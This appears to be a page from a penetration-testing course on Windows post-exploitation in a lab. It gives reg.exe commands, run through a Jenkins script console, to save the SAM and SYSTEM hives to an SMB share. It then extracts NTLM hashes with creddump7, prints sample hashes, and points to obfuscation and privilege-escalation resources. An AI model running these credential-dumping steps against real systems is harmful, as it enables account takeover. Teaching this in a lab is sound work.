+++
title = "Windows PE"
weight = 1
+++

## Local Password Hashes
Windows stores local user account password hashes in the Security Accounts Manager or *SAM* registry hive.  
Additionally, there is a key needed to decrypt  the encrypted hashes located in the *System* registry hive.

* Use your Jenkins script console to execute the following two commands
  * `reg.exe save hklm\sam c:\users\richard.f\xampp\sam`
  * `reg.exe save hklm\system c:\users\richard.f\xampp\sys`

![](./hash1.png)

These errors are common when using some type of web based shell to execute operating system commands via a scripting language such as Groovyscript.
The short answer is that the *\\* is being processed by the scripting interpreter as code.
You need to escape these characters by prepending them with an additional *\\* character.

![](./hash2.png)

Now run both commands with the proper character escaping and this will place a copy of the two registry hive 
files inside the xampp SMB share. You can then use smbclient to download to your attacking machine.

![](./hash3.png)

### Extracting hashs with creddump7 
Next we'll use an oldie but a goodie, creddump, to extract the hashes from the SAM!

* Download the *.deb* package.
  *  `wget http://tw.archive.ubuntu.com/ubuntu/pool/universe/c/creddump7/creddump7_0.1+git20190429-1.1_all.deb`
* Install the package
  * `sudo dpkg -i creddump7_0.1+git20190429-1.1_all.deb` 

Now run the following command from inside the directory where you saved **sys** and **sam**.

`/usr/share/creddump7/pwdump.py sys sam > hashes.txt`

##### hashes.txt

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa4621870bd7787de99541e0699e738c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:2620172f5a22c57e5c7a5450e21313b8:::
```
## Privilege escalation via PowerShell
Install *pyfuscation* from github.

`cd /opt`

`git clone https://github.com/CBHue/PyFuscation.git`

### Additional privilege escalation resources

Here are some suplimental resources for you to read through outside of class.

* [Fantastic Markdown cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
* [FuzzySecurity Windows Priv. Esc. Fundimentals](https://fuzzysecurity.com/tutorials/16.html)
* [Windows Priv. Esc. by Joseph Carson](https://delinea.com/blog/windows-privilege-escalation)
